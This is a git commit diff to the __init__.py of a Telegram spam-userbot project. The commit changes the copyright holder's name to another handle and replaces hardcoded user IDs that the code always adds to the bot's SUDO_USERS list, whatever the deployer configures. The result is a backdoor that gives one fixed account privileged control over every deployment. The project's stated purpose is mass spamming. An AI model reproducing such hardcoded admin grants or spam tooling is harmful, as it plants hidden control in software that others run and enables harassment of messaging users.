49bc3df948cf1f31af59162aca4fd25b6ebb218e
venomowners20912 <107359122+venomowners20912@users.noreply.github.com>
2022-07-26 08:00:20 +0530

    __init__.py

--- RiZoeLXSpam/__init__.py
+++ RiZoeLXSpam/__init__.py
@@ -1,5 +1,5 @@
 # RiZoeLXSpam - Spam Userbots
-# Copyright © 2021 @RiZoeLX
+# Copyright © 2021 @dostokijaan
 
 import os
 import sys
@@ -38,15 +38,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5506732177 not in SUDO_USERS:
+    SUDO_USERS.append(5506732177)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(5506732177)
 
 # Tokens
 
